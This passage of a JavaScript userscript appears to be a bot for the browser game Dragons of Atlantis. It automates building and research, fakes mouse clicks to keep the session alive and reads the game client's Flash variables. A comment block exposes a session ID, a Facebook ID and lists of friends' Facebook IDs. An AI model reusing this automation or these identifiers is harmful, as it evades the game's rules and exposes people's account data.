    [3, 'Halberdsman', 'Baltacilar'],
    [4, 'Minotaur', 'Minotaur'],
    [5, 'Longbowman', 'Okcu'],
    [6, 'SwiftStrikeDragon', 'CAD'],
    [7, 'BattleDragon', 'SD'],
    [8, 'ArmoredTransport', 'Zeplin'],
    [9, 'Giant', 'Dev'],
    [10, 'FireMirror', 'Ates A'],
    [11, 'AquaTroop', 'ZP'],
    [12, 'StoneTroop', 'Granit O'],
    [13, 'FireTroop', 'Lav D.'],
    [14, 'WaterDragon', 'Su D.'],
    [15, 'StoneDragon', 'Tas D.'],
    [16, 'FireDragon', 'Ates D.']
    ],
  }, 
  
  items : {
    'names' : [
    [1, 'Adım At', 'Adım At'],
    [2, 'Hop', 'Hopla'],
    [3, 'Skip', 'Geç'],
    [4, 'Jump', 'Atla'],
    [5, 'Leap', 'Sıçrama'],
    [6, 'Bounce', 'Zıpla'],
    [100, 'AquaTroopRespirator', 'Nefes A.A.'],
    [101, 'AquaTroopRespiratorStack100', 'Nefes A.A.-100'],
    [102, 'AquaTroopRespiratorStack500', 'Nefes A.A.-500'],
    [103, 'AquaTroopRespiratorStack1000', 'Nefes A.A.-1000'],
    [110, 'GreatDragonBodyArmor', 'Büyük Dragon Vücut Z.'],
    [111, 'GreatDragonHelmet', 'Büyük Dragon Miğferi'],
    [112, 'GreatDragonTailGuard', 'Büyük Dragon Kuyruk Z. '],
    [113, 'GreatDragonClawGuards', 'Büyük Dragon Pençe Z.'],
    [114, 'WaterDragonBodyArmor', 'Büyük Dragon Vücut Z.'],
    [115, 'WaterDragonHelmet', 'Su Dragonu Miğferi'],
    [116, 'WaterDragonTailGuard', 'Su Dragonu Kuyruk Z.'],
    [117, 'WaterDragonClawGuards', 'Su Dragonu Pençe Z.'],
    [118, 'WaterDragonEgg', 'Su Dragonu Yumurtası'],
    [120, 'StoneDragonEgg', 'Taş dragonu Yumurtası'],
    [121, 'StoneDragonBodyArmor', 'Taş Dragonu Vücut Z.'],
    [122, 'StoneDragonHelmet', 'Taş Dragonu Miğferi'],
    [123, 'StoneDragonTailGuard', 'Taş Dragonu Kuyruk Z.'],
    [124, 'StoneDragonClawGuards', 'Taş Dragonu Pençe Z.'],
    [125, 'StoneTroopItem', 'Sihirli Kök'],
    [126, 'StoneTroopItemStack100', 'Sihirli Kök-100'],
    [127, 'StoneTroopItemStack500', 'Sihirli Kök-500'],
    [128, 'StoneTroopItemStack1000', 'Sihirli Kök-1000'],
    [129, 'FireDragonEgg', 'Ateş Dragonu Yumurtası'],
    [130, 'FireDragonBodyArmor', 'Ateş Dragonu-1'],
    [131, 'FireDragonHelmet', 'Ateş Dragonu-2'],
    [132, 'FireDragonTailGuard', 'Ateş Dragonu-3'],
    [133, 'FireDragonClawGuards', 'Ateş Dragonu-4'],
	[134, 'FireTroopItem', 'Volkanik Run'],
    [135, 'FireTroopItemStack100', 'Volkanik Run-100'],
    [136, 'FireTroopItemStack500', 'Volkanik Run-500'],
    [137, 'FireTroopItemStack1000', 'Volkanik Run-1000'] 
 	
    ],
  }, 

  itemAbbr : function (name){
    var x = Names.items.byName[name]; 
    if (x)
      return x[2];
    return name.substr (0, 14);
  },
  
  
/***  
EpeoradMetalsNanosWeek
EpeoradMetalsNanosDay
OreadStoneNanosDay
AtlagenHarvestNanosDay
NanoCollectorWeek
DryadForestNanosWeek
NanoCanisters
DryadForestNanosDay
NanoCollectorDay
DoubleTaxDayDeclaration
Gold10K
Wood25K
Wood250K
OutpostWarp
CompletionGrant
TranceMarchDrops
FortunasTicket
DragonHearts
EasterChest

RenameProclamation
CrimsonBull
ForcedMarchDrops
CeaseFireTreaty
FoundersChest
PurpleBones
MassNullifier
****/    
  
  init : function (){
    var t = Names;
    t.makeIdx (t.troops);
    t.makeIdx (t.items);
  },
  
  makeIdx : function (o){
    byId = {};
    byAbbr = {};
    byName = {};
    var n = o.names;
    for (var i=0; i<n.length; i++){
      byId[n[i][0]] = n[i];
      byAbbr[n[i][2]] = n[i];
      byName[n[i][1]] = n[i];
    }
    o.byId = byId;
    o.byAbbr = byAbbr;
    o.byName = byName;
  },
} 
Names.init ();


Tabs.Debug = {
  tabOrder : DEBUG_TAB_ORDER,
  tabLabel : 'Dbg',
  tabDisabled : !ENABLE_DEBUG_TAB,
  cont : null,
  
  init : function (div){
    var t = Tabs.Debug;
    t.cont = div;
    t.mouseElement = div;
    div.innerHTML = '<TEXTAREA id=pbdbgUnTxt row=3 cols=50></textarea><INPUT type=submit value="unescape" id=pbdbgUn></input><BR><BR>\
      <INPUT type=submit value="Seed.s" id=pbdbgSeedS\> <BR>\
      <INPUT type=submit value="Seed.JOBS.CITY" id=pbdbgSeedJobCity\><BR>\
      <INPUT type=submit value="Seed.MARCHES" id=pbdbgSeedMarches\><BR>\
      <INPUT type=submit value="Seed buildings" id=pbdbgSeedBuildings\><BR><BR>\
      <INPUT type=submit value="Set all camp.last to null" id=pbdbgLastNull></input>\
      <INPUT type=submit value="Clear MAP data" id=pbdbgClearMap></input><BR>\
      <INPUT type=submit value="check reports" id=pbdbgReports></input><BR>\
      <INPUT type=submit value="Persistant Data" id=pbdbgData></input><BR>\
      <INPUT type=submit value="Scripts" id=pbdbgScripts></input><BR>\
      <INPUT type=submit value="click" id=pbdbgClick></input> \
      <INPUT type=submit value="move" id=pbdbgMoveM></input><BR><BR>\
      <DIV style="background-color:#eee; margin:5px"><CENTER><INPUT style="width:130px" class=butAttackOff id=pbdbgTMonoff type=submit value="Track Mouse Off"><BR><DIV id=pbdbgCoords>  </div></center></div>\
      <BR>Missing Reports:<SPAN id=pbdbgMissRpt></span>    <INPUT id=pbdbgResetMR type=submit value="RESET" \>\
      <BR><SPAN class=boldRed>Keep-alive is running!</span>';
    document.getElementById('pbdbgUn').addEventListener ('click', t.unescape, false);
    document.getElementById('pbdbgSeedS').addEventListener ('click', t.seedS, false);
    document.getElementById('pbdbgSeedJobCity').addEventListener ('click', t.seedJobsCity, false);
    document.getElementById('pbdbgSeedMarches').addEventListener ('click', t.seedMarches, false);
    document.getElementById('pbdbgSeedBuildings').addEventListener ('click', t.seedBuildings, false);
    document.getElementById('pbdbgClearMap').addEventListener ('click', t.clearMap, false);
    document.getElementById('pbdbgLastNull').addEventListener ('click', t.setLastNull, false);
    document.getElementById('pbdbgReports').addEventListener ('click', t.readReports, false);
    document.getElementById('pbdbgScripts').addEventListener ('click', t.dispScripts, false);
    document.getElementById('pbdbgClick').addEventListener ('click', t.clickMouse, false);
    document.getElementById('pbdbgMoveM').addEventListener ('click', t.moveMouse, false);
    document.getElementById('pbdbgTMonoff').addEventListener ('click', t.trackMouseEnable, false);
    document.getElementById('pbdbgData').addEventListener ('click', t.dispData, false);
    document.getElementById('pbdbgResetMR').addEventListener ('click', function(){Data.options.messages.missing=0; t.showMissingReports()}, false);
    t.mouseDispDiv = document.getElementById('pbdbgCoords');
    t.keepAlive ();
    t.showMissingReports ();
  },

  show : function (){
  },
  hide : function (){
  },

  seedBuildings : function (){
    var t = Tabs.Debug;
    t.dispBuildings ('Seed.s.cities[0].buildings', Seed.s.cities[0].buildings);
    t.dispBuildings ('Seed.s.cities[1].buildings', Seed.s.cities[1].buildings);
  },
  
  dispScripts : function (){
    pop = new CPopuppa ('debug', 0,0, 1000,800, true); 
    pop.getTopDiv ().innerHTML = '<B><CENTER><FONT COLOR=#FFFFFF>Debug - List Scripts</center></b>' ;
    var scripts = document.getElementsByTagName('script');
    var m = '<DIV style="height:560px; max-height:560px; overflow-y:auto; overflow-x:auto">';
    for (var i=0; i<scripts.length; i++){
      var code = scripts[i].innerHTML;
      if (code == undefined)
        m += 'Yok code<BR>';
      else
        m += 'Source: '+ scripts[i].src +'<BR>Length: '+ code.length +'<BR>'+ code.substr(0,1000).htmlEntities() +'<BR><HR>';
    }
    pop.getMainDiv().innerHTML = '</div>'+ m;
    pop.show(true);
  },  
    
  dispBuildings : function (msg, buildings){
    var b = [];
    for (var i=0; i<buildings.length; i++)
      b.push (buildings[i]);
      b.sort (function (a,b){
      if (a.location != b.location){
        if (a.location == 'city')
          return -1;
        return 1;
      }
      return a.slot - b.slot;
    });
    var m = msg + ':\n';
    for (var i=0; i<b.length; i++)
      m += b[i].location +' slot #'+ b[i].slot +' : Level '+ b[i].level +' '+ b[i].type +'\n';
    logit (m);
  },
  
  showMissingReports : function (){
    var t = Tabs.Debug;
    document.getElementById('pbdbgMissRpt').innerHTML = Data.options.messages.missing;
    setTimeout (t.showMissingReports, 2000);
  },
  
  readReports : function (){
    Messages.checkMessages();
  },
  seedS : function (){
    logit (inspect (Seed.s, 8, 1));
  },
  seedJobsCity : function (){
    var now = parseInt(serverTime());
    for (var c in Seed.jobs)
      logit ('Seed.jobs['+ c +'] (city #'+ Seed.cityIdx[c] +') now='+ now +':\n'+ inspect (Seed.jobs[c], 8, 1));
  },
  seedMarches : function (){
    var now = parseInt(serverTime());
    var msg = '***** Seed.marches: *****  (now='+ parseInt(serverTime())+')\n';
    for (var p in Seed.marches){
      var march = Seed.marches[p];
      var status = march.status;
      if (status == 'returning')
        status = 'returning ';
      msg += 'OWNER: '+  march.ownerId +' ID: '+ march.id +' '+ status +' '+ march.x +','+ march.y +' '+ march.run_at +'('+ (march.run_at-now)  +') '+ march.duration +'\n';
    }
    logit (msg);
  },
  
  dispData : function (){
    var m = '';
    for (var i=0; i<Data.names.length; i++)
      m += '***** Data.'+ Data.names[i] +':\n'+ inspect (Data[Data.names[i]], 12, 1);
    logit (m);
  },
  clearMap : function (){
    Tabs.AutoAttack.targets.radius = 0;
    Tabs.AutoAttack.targets.camps = [];
  },
  setLastNull : function (){
    for (var i=0; i<Tabs.AutoAttack.targets.camps.length; i++)
      Tabs.AutoAttack.targets.camps[i].last = null;
  },

keepAlive : function (){
  var t = Tabs.Debug;
  t.createMouseClick (document.getElementById('castlemania_swf_container'), 0, 0, 0, 0);
  setTimeout (t.keepAlive, 60000);
},
  
  trackMouse : false,
//  mouseElement = document.getElementById('castlemania_swf_container');
  trackMouseEnable : function (e){
    var t = Tabs.Debug;
    if (t.trackMouse){
      e.target.value = 'Track Mouse OFF'
      e.target.className = 'butAttackOff';
      t.mouseElement.removeEventListener('mousemove', t.moveHandler, true);
    } else {
      e.target.value = 'Track Mouse ON'
      e.target.className = 'butAttackOn';
      t.mouseElement.addEventListener('mousemove', t.moveHandler, true);
    }
    t.trackMouse = !t.trackMouse;
  },
  moveHandler : function (me){
    var t = Tabs.Debug;
    t.mouseDispDiv.innerHTML = 'Client: '+ me.clientX +','+ me.clientY +'    Screen: '+ me.screenX +','+ me.screenY;
  },
  
  clickMouse : function (){
    var t = Tabs.Debug;
//    t.createMouseClick (t.mouseElement, 874,280,803,183);
    t.createMouseClick (document.getElementById('pbdbgUn'), 0, 0, 0, 0);
  },
  moveMouse : function (){
    var t = Tabs.Debug;
    setTimeout (function (){
      var evObj = document.createEvent('MouseEvents');
      evObj.initMouseEvent( 'move', true, false, window, 0,   874,280,803,183,   false, false, true, false, 0, null );
      var cancelled = !t.cont.dispatchEvent(evObj);
      logit ('Mouse moved, cancelled='+ cancelled);
    }, 2000);
  },
  unescape : function (div){
    var t = Tabs.Debug;
    var e = document.getElementById('pbdbgUnTxt');
    e.value = unescape (e.value);
  },

  createMouseClick : function (e, screenX, screenY, clientX, clientY){
    var evObj = document.createEvent('MouseEvents');
    var cancellable = false;
    evObj.initMouseEvent( 'click', true, cancellable, window, 1, screenX, screenY, clientX, clientY, false, false, true, false, 0, null );
    var cancelled = !e.dispatchEvent(evObj);
    logit ('Mouse dispatched, cancelled='+ cancelled);
  },

  
}



/**************
C.attrs:   
  (string) apiServer = http://realm57.c6.castle.wonderhill.com/api
  (string) appId = 111896392174831
  (string) appPath = http://apps.facebook.com/dragonsofatlantis
  (number) clientTime = 1303048825
  (string) facebookId = 1400526627
  (string) locale = en
  (number) playerId = 400086503
  (boolean) production = true
  (boolean) publishToFacebook = true
  (number) realmId = 57
  (string) s3Server = http://castlemania-production.s3.amazonaws.com
  (string) s3SwfPrefix = /flash/game/current
  (number) serverTime = 1303048829
  (string) sessionId = c681b23d48531835624085c5ba1a7a79
  (number) userId = 2395058
  (number) viralCohortId = 9999
  (string) pubServer = pub.castle.wonderhill.com
  (number) pubPort = 7000
  (string) preloaderCachebreaker = 1302888680
  (string) primaryUICachebreaker = 1302123068
  (string) secondaryUICachebreaker = 1302123081
  (string) buildingCachebreaker = 1302043432
  (string) soundCachebreaker = 1300136852
  (string) lazyLoadedSwfCachebreaker = 1302043433
  (array) playerGeneralFacebookIds = 511766946,531413843,1408508145,1583521095,1630864998,1641056237,100000233332372,100000629563828
  (boolean) isFan = false
  (boolean) hasExtPerms = false
  (array) appFriendIds = 1400526627,511766946,513290679,517317030,587021483,594053295,607773106,628608909,685297360,769038534,829965606,1266963775,1311343917,1361197746,1383471858,1408508145,1408906378,1432144775,1630864998,1641056237,1655875848,1661333219,100000232672930,100000475977050,100000569950692,100000583783925,100000629563828
  (array) nonAppFriends = .................
  (array) generalFriends = .................
  (array) appFriends = ................
************/


function getSwfVar (name){
  var s = 'function swfGetVar (name){\
    var swf = document.getElementById("castlemania_swf");\
    swf.setAttribute("allowscriptaccess", "always");\
    swf.setAttribute("swliveconnect", "true");\
    var val = swf.GetVariable(name);\
    return val;}';
  var e = document.createElement('script');
  e.innerHTML = s;
  document.body.appendChild (e);
  return unsafeWindow.swfGetVar (name);
}

var TestSomething = {
  init : function (){
    t = TestSomething;
  }, 
}

function parseIntNan (n){
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x; 
}
function parseIntZero (n){
  if (!n || n=='')
    return 0;
  return parseInt(n, 10);
}



// class
function MarchTracker (){
  var marches = {};
  
  function MarchTracker (){
  }

  this.setReportDelete = function (onOff){
  }
  this.setTroopLossListener = function (listener){
  }
  
  
} 



/****************************************JOB TAB********************************************************/
Tabs.Jobs = {
	tabOrder : JOB_TAB_ORDER,
	tabLabel : 'Jobs',
	tabDisabled : !ENABLE_DEBUG_TAB,
	cont : null,
	timer : null,
	capitalResearch : ['Agriculture', 'Woodcraft', 'Masonry', 'Alloys', 'Clairvoyance', 'Rapid Deployment', 'Weapons Calibration', 'Metallurgy', 'Medicine', 'Dragonry', 'Levitation', 'Mercantilism', 'Aerial Combat'],
  
	init : function (div){
		var t = Tabs.Jobs;
		t.cont = div;
		div.innerHTML =  '<TABLE width=100% bgcolor=#ffffd0 align=center><TR><TD>\
			<INPUT type=submit value="Info" id=pbjobInfo></INPUT>\
			<INPUT type=submit value="Build" id=pbjobBuild></INPUT>\
			<INPUT type=submit value="Research" id=pbjobResearch></INPUT>\
			<INPUT type=submit value="Train" id=pbjobTrain></INPUT>\
			</td></tr></table>\
			<DIV id=pbjobContent style="padding-top:5px; height:480px; max-height:480px; overflow-y:auto;"></div>';
			
		document.getElementById('pbjobInfo').addEventListener ('click', t.tabJobInfo, false);
		document.getElementById('pbjobBuild').addEventListener ('click', t.tabJobBuild, false);
		document.getElementById('pbjobResearch').addEventListener ('click', t.tabJobResearch, false);
		document.getElementById('pbjobTrain').addEventListener ('click', t.tabJobTrain, false);	
		
		t.tabJobInfo();
	},

	show : function (){
		var t = Tabs.Jobs;
		t.tabJobInfo();
	},
	
	hide : function (){
		var t = Tabs.Jobs;
		clearTimeout (t.timer);
	},

	tabJobInfo : function (){
		var t = Tabs.Jobs;
		clearTimeout (t.timer);
		var city = Seed.s.cities[0];
		var m = '<DIV class=pbTitle>Information</DIV>';
		m += cityTitle(0);
		m += '<TABLE class=pbTabPad>' + dispBuildingJob(0) + dispResearchJob(0) + dispTrainingJobs(0) + '</td></tr></table>';
  
		// outposts ...
		if (Seed.s.cities.length > 0){
			for (var i=1; i<Seed.s.cities.length; i++){
				m += '<DIV class=short></div>'+ cityTitle(i) + '<TABLE class=pbTabPad>' + dispBuildingJob(i) + dispTrainingJobs(i) + '</td></tr></table>';
			}
		}
    
		document.getElementById('pbjobContent').innerHTML = m; 
		t.timer = setTimeout (t.tabJobInfo, 1000);
    	
		// Display build queue
		function dispBuildingJob (cityIdx){
			var m = '<TR><TD class=pbTabLeft>İnsaa Ediliyor:</td>';
			var job = getBuildingJob (cityIdx);
			if (job)
				m += '<TD>'+ job.building.type +' level '+ job.job.level +'</td><TD class=pbTabRight>'+ timestr(job.job.run_at - serverTime(), true) +'</td></tr>';
			else
				m += '<TD colspan=2><SPAN class=boldRed>NONE</span></td></tr>';
			return m;
		}
	
		// Display research queue
		function dispResearchJob (cityIdx){
			var m = '<TR><TD class=pbTabLeft>Arastirma:</td>';
			var job = getResearchJob (cityIdx);
			if (job)
				m += '<TD>'+ job.research_type +' level '+ job.level +'</td><TD class=pbTabRight>'+ timestr(job.run_at - serverTime(), true) +'</td></tr>';
			else
				m += '<TD colspan=2><SPAN class=boldRed>NONE</span></td></tr>';
			return m;
		}
	
		// Display training queues
		function dispTrainingJobs (cityIdx){
			var m = '';
			var last = serverTime();
			var trains = [];
			for (var i=0; i<Seed.s.cities[cityIdx].jobs.length; i++)
				if (Seed.s.cities[cityIdx].jobs[i].queue=='units' && Seed.s.cities[cityIdx].jobs[i].unit_type)
					trains.push (Seed.s.cities[cityIdx].jobs[i]);
			for (var i=0; i<trains.length; i++){
				var left='', tot='';
				if (i==0)
					left = 'Training:';
				m += '<TR><TD class=pbTabLeft>'+ left +'</td><TD>'+ trains[i].quantity +' '+ trains[i].unit_type +' </td><TD class=pbTabRight> '+ timestr(trains[i].run_at-last, true) +'</td></tr>';
				last = trains[i].run_at;
			}      
			return m;
		}
	},
  
	tabJobBuild : function (){
		var t = Tabs.Jobs;
		clearTimeout (t.timer);
		var m = '<DIV class=pbTitle>Auto Build</div>';
		document.getElementById('pbjobContent').innerHTML = m;	

	},
  
	tabJobResearch : function (){
		var t = Tabs.Jobs;
		clearTimeout (t.timer);
		
		// Initialise Array
		for (var i=0; i<Seed.s.cities.length; i++)
			if (!Data.options.autoResearch.researchEnable[i])
				Data.options.autoResearch.researchEnable[i] = {};
		
		var m = '<DIV class=pbTitle>Auto Research</DIV>\
			<DIV><CENTER><INPUT id=pbjobResearchOnOff type=submit\></CENTER></DIV>\
			<DIV id=pbjobResearchonfig class=pbInput>';
			
		m += cityTitle(0);
	
		var el = [];
		var ml = [];
		var pl = [];
		//for (var i=0; i<Seed.s.cities.length; i++){
		//	if (i==0){
		//		listC = t.capitalCity;
		//		listF = t.capitalField;
		//	} else {
		//		listC = t.outpostCity;
		//		listF = t.outpostField;
		//	}
		//	var city = Seed.s.cities[i];
		//	m += '<DIV class=pbSubtitle>City #'+ (i+1) +' ('+ city.type +')</div><TABLE class=pbTab><TR valign=top><TD width=150><TABLE class=pbTab>';
		for (var r=0; r<t.capitalResearch.length; r++){
			m += '<TR>';
			m += '<TD>'+ t.capitalResearch[r] +'</td>';
			m += '<TD><INPUT type=checkbox id="pbjobResearchcb_0_'+ t.capitalResearch[r] +'" '+ (Data.options.autoResearch.researchEnable[0][t.capitalResearch[r]]?'CHECKED':'') +' /></td>';
			m += '<TD><INPUT type=text id="pbjobResearchMax_0_' + t.capitalResearch[r] +'" maxlength=2 size=1 value=10 /></td>';
			m += '<TD><INPUT type=text id="pbjobResearchPriority_0_' + t.capitalResearch[r] +'" maxlength=2 size=1 value=1 /></td>';
			m += '</tr>';  
			el.push('pbjobResearchcb_0_'+ t.capitalResearch[r]);
		}
		//	m += '</table></td><TD><TABLE class=pbTab>';  
		//	for (var ii=0; ii<listF.length; ii++){
		//		m += '<TR><TD><INPUT type=checkbox id="pbbldcb_'+ i +'_'+ listF[ii] +'" '+ (Data.options.autoBuild.buildingEnable[i][listF[ii]]?'CHECKED':'') +' /></td><TD>'+ listF[ii] +'</td></tr>';  
		//		el.push('pbbldcb_'+ i +'_'+ listF[ii]);
		//	}
		//	m += '</table></td></tr></table>';
		//}    
		//m += '</DIV>';
		document.getElementById('pbjobContent').innerHTML = m;
	
		//setEnable(Data.options.autoResearch.enabled);
		
		// Event listeners
		document.getElementById('pbjobResearchOnOff').addEventListener ('click', function (){ setEnable (!Data.options.autoResearch.enabled); }, false);
		for (var i=0; i<el.length; i++)
			document.getElementById(el[i]).addEventListener('click', checked, false);
		for (var i=0; i<ml.length; i++)
			document.getElementById(ml[i]).addEventListener('change', maxChanged, false);
		for (var i=0; i<pl.length; i++)
			document.getElementById(pl[i]).addEventListener('change', priorityChanged, false);

		function setEnable (onOff){
			var but = document.getElementById('pbjobResearchOnOff');
			Data.options.autoResearch.enabled = onOff;
			if (onOff){
				but.value = 'Auto Research ON';
				but.className = 'butAttackOn';
				//t.buildTick();
			} else {
				but.value = 'Auto Research OFF';
				but.className = 'butAttackOff';
			}
		}
		
		function maxChanged (){
		}
		
		function priorityChanged (){
		}
		


	},

	tabJobTrain : function (){
		var t = Tabs.Jobs;
		clearTimeout (t.timer);
		var m = '<DIV class=pbTitle>Auto Train</div>';
		document.getElementById('pbjobContent').innerHTML = m;	
	},
  
	refresh : function (){
		var t = Tabs.Jobs;
		Seed.fetchSeed (t.showStuff());  
	},
}

// Display city details
function cityTitle (cityIdx){
 var city = Seed.s.cities[cityIdx];
 return '<div class=pbSubtitle><TABLE class=pbTab><TR><TD>City #'+ (cityIdx+1) +'</td><TD width=80% align=center>'+translate(city.name)+'</td><TD align=right>'+ city.x +','+ city.y +'</td></tr></table></div>';
}


/********************************   BUILD Tab *****************************/
Tabs.Build = {
  tabOrder : BUILD_TAB_ORDER,
  tabLabel : gBuild,
  cont : null,
  buildTimer : null,
  statTimer : null,
  capitalCity : ['Home', 'Garrison', 'ScienceCenter', 'Metalsmith', 'OfficerQuarter', 'MusterPoint', 'Rookery', 'StorageVault', 'Theater', 'Sentinel', 'Factory', 'Fortress', 'DragonKeep', 'Wall'],
  capitalCity2 : ['Ev', 'Garnizon', 'Bilim Merkezi', 'Demirci', 'Subay Karargahi', 'Ictima Alani', 'D.Yuvasi', 'Depo', 'Tiyatro', 'Gozcu', 'Fabrika', 'Kale', 'Dragon Kalesi', 'Sur'],
  capitalField : ['Mine', 'Farm', 'Lumbermill', 'Quarry'],
  capitalField2 : ['Maden Ocagi', 'Ciftlik', 'Kereste Fabrikasi', 'Tas Ocagi'],
  outpostCity : ['TrainingCamp', 'Home', 'Silo', 'MusterPoint', 'DragonKeep', 'Wall'],
  outpostCity2 : ['Egitim Kampi', 'Ev', 'Silo', 'Ictima Alani', 'Dragon Kalesi', 'Sur'],
  outpostField : ['Mine', 'Farm', 'Lumbermill', 'Quarry'],
  outpostField2 : ['Maden Ocagi', 'Ciftlik', 'Kereste Fabrikasi', 'Tas Ocagi'],
  
  init : function (div){
    var t = Tabs.Build;
    t.cont = div;
    for (var i=0; i<Seed.s.cities.length; i++)
      if (!Data.options.autoBuild.buildingEnable[i])
        Data.options.autoBuild.buildingEnable[i] = {};
    
    var m = '<DIV class=pbTitle>'+translate( 'Binalari Otomatik Yukselt' )+'</div>\
      <DIV class=pbStatBox><CENTER><INPUT id=pbbldOnOff type=submit\></center>\
      <DIV id=pbbldBldStat></div> <BR> <DIV id=pbbldFeedback style="font-weight:bold; border: 1px solid #AA00FF; min-height:17px;"></div>  </div>\
      <DIV id=pbbldConfig class=pbInput>';
    var el = [];
    for (var i=0; i<Seed.s.cities.length; i++){
      if (i==0){
        listC = t.capitalCity2; // TODO: Translate
        listD = t.capitalCity;
        listF = t.capitalField2; // TODO: Translate
        listE = t.capitalField;
      } else {
        listC = t.outpostCity2; // TODO: Translate
        listD = t.outpostCity;
        listF = t.outpostField2; // TODO: Translate
        listE = t.outpostField;
      }
      var city = Seed.s.cities[i];
      m += '<DIV class=pbSubtitle><TABLE class=pbTab><TR><TD>'+translate('City')+' #'+ (i+1) +'</td><TD width=80% align=center>'+ translate( city.name ) +'</td><TD align=right>'+ city.x +','+ city.y +'</td></tr></table></div><TABLE class=pbTab><TR valign=top><TD width=150><TABLE class=pbTab>';
      for (var ii=0; ii<listC.length; ii++){
        m += '<TR><TD><INPUT type=checkbox id="pbbldcb_'+ i +'_'+ listD[ii] +'" '+ (Data.options.autoBuild.buildingEnable[i][listD[ii]]?'CHECKED':'') +' /></td><TD>'+ listC[ii] +'</td></tr>';  
        el.push('pbbldcb_'+ i +'_'+ listD[ii]);
      }
      m += '</table></td><TD><TABLE class=pbTab>';  
      for (var ii=0; ii<listF.length; ii++){
        m += '<TR><TD><INPUT type=checkbox id="pbbldcb_'+ i +'_'+ listE[ii] +'" '+ (Data.options.autoBuild.buildingEnable[i][listE[ii]]?'CHECKED':'') +' /></td><TD>'+ listF[ii] +'</td></tr>';  
        el.push('pbbldcb_'+ i +'_'+ listE[ii]);
      }m += '</table></td><TD><TABLE class=pbTab>';
      
      m += '</table></td></tr></table>';
    }    
    m += '</div>';
    div.innerHTML = m;
    for (var i=0; i<el.length; i++)
      document.getElementById(el[i]).addEventListener('click', checked, false);
    t.setEnable (Data.options.autoBuild.enabled);
    document.getElementById('pbbldOnOff').addEventListener ('click', function (){
      t.setEnable (!Data.options.autoBuild.enabled);
    }, false);
    
    function checked (evt){
      var id = evt.target.id.split ('_');
      var cityId = Seed.s.cities[id[1]].id;
      Data.options.autoBuild.buildingEnable[id[1]][id[2]] = evt.target.checked;
    }
  },
  
  hide : function (){
    var t = Tabs.Build;
    clearTimeout (t.statTimer);
  },
  show : function (){
    var t = Tabs.Build;
    t.statTick();
  },
  
  setEnable : function (onOff){
    var t = Tabs.Build;
    var but = document.getElementById('pbbldOnOff');
    clearTimeout (t.buildTimer);
    Data.options.autoBuild.enabled = onOff;
    if (onOff){
      but.value = translate( 'Oto Insaat Acik' );
      but.className = 'butAttackOn';
      t.buildTick();
    } else {
      but.value = translate( 'Oto Insaat Kapali' );
      but.className = 'butAttackOff';
    }
  },
  
  statTick : function (){
    var t = Tabs.Build;
    var m = '<TABLE class=pbTabPad>';
    clearTimeout (t.statTimer);
    for (var i=0; i<Seed.s.cities.length; i++){
      var city = Seed.s.cities[i];
      var job = getBuildJob (i);
      m += '<TR><TD>'+ translate(city.name) +'</td><TD>';
      if (job == null)
        m += '<SPAN class=boldRed>'+translate( 'No' )+'</span></td></tr>';
		
      else {
        var b = Buildings.getById(i, job.city_building_id);
        m += ''+translate( 'Insa Ediliyor' )+' </td><TD>'+translate( 'level' )+' '+ job.level +' '+ translate( b.type )  +'</td><TD>'+ timestr(job.run_at-serverTime(),true)  +'</td></tr>';
      }
    }
    document.getElementById('pbbldBldStat').innerHTML = m +'</table>';
    t.statTimer = setTimeout (t.statTick, 5000);
  },
  
  dispFeedback : function (msg){
    document.getElementById('pbbldFeedback').innerHTML = new Date().toTimeString().substring (0,8) +' '+  msg;
  },

  errorCount : 0,
  reChecked : false,
  buildTick : function (){
    var t = Tabs.Build;
    clearTimeout (t.buildTimer);
    if (!Data.options.autoBuild.enabled)
      return;
      
    Seed.notifyOnUpdate(function(){
        var nothingToDo = true;    
        for (var ic=0; ic<Seed.s.cities.length; ic++ ){
          var city = Seed.s.cities[ic];
          if (getBuildJob (ic) == null){     // city not currently building
            // find lowest level eligible building ...
            var bl = [];
            for (var p in Data.options.autoBuild.buildingEnable[ic]){
              if (Data.options.autoBuild.buildingEnable[ic][p])
                bl = bl.concat (Buildings.getList (ic, p));
            }
            var building = null;  
            var lowest = 9; 
            for (var ib=0; ib<bl.length; ib++){
              if (bl[ib].level < lowest){
                lowest = bl[ib].level;
                building = bl[ib];
              }
            }
            if (building != null){
              if (building.level>5 && !t.reChecked){ 
logit ('BUILD: rechecking city');
                t.reChecked = true;
                Seed.fetchCity (city.id, 1000);
                t.buildTimer = setTimeout (t.buildTick, 500);
              } else {
                t.reChecked = false;
                t.doBuild (building, city);
              }
              return;
            }
          } else {
            nothingToDo = false;
          }
        }
t.reChecked = false;        
        if (nothingToDo){
          t.dispFeedback ('Niente da fare, sto disabilitando l\'auto-costruzione.'); // TODO: Translate
          t.setEnable (false);
          return;
        }
        t.buildTimer = setTimeout (t.buildTick, 8000);
    }); 
  },
  
  doBuild : function (building, city){
    var t = Tabs.Build;
    if (building.level == 9)
        return;
    var msg = ''+translate( 'Building level' )+' '+ (building.level+1) +' '+translate( 'of' )+' '+ translate( building.type ) +' '+translate( 'at' )+' '+ translate( city.name );
    t.dispFeedback (msg);
    Ajax.buildingUpgrade (city.id, building.id, function (rslt){
//  logit ('BUILD RESULT: '+ inspect (rslt, 7, 1)); 
      t.statTick();
      if (rslt.ok){
        t.errorCount = 0;
        actionLog (msg);
        t.buildTimer = setTimeout (t.buildTick, 8000);
        return;
      } else {
        Seed.fetchSeed();
        actionLog ('COSTR.ERRORE: '+ rslt.errmsg);
        if (++t.errorCount > 3){
          t.dispFeedback ('Troppi errori, sto disabilitando l\'auto-costruzione.');
          t.setEnable (false);
          return;
        }
        t.dispFeedback ('COSTR.ERRORE: '+ rslt.errmsg);
        t.buildTimer = setTimeout (t.buildTick, 20000);
        return;
      }
    });
  },
  
}

 function getBuildJob (cityIdx){
  var cid = Seed.s.cities[cityIdx].id;
  var jobs = Seed.jobs[cid];
  for (var p in jobs){
    if (jobs[p].queue == 'building')
      return jobs[p];
  }
  return null;
 }

/********************************   TRAIN Tab *****************************/
Tabs.Train = {
  tabOrder : TRAIN_TAB_ORDER,
  tabLabel : gTrain,
  cont : null,
  trainTimer : null,
  statTimer : null,
  capitalTroops : ['Porter', 'Conscript', 'Spy', 'Halberdsman', 'Minotaur', 'Longbowman', 'SwiftStrikeDragon', 'BattleDragon', 'ArmoredTransport', 'Giant', 'FireMirror'],
  outpost1Troops : ['Porter', 'Conscript', 'Spy', 'Halberdsman', 'Minotaur', 'Longbowman', 'SwiftStrikeDragon', 'BattleDragon', 'ArmoredTransport', 'Giant', 'FireMirror', 'AquaTroop'],
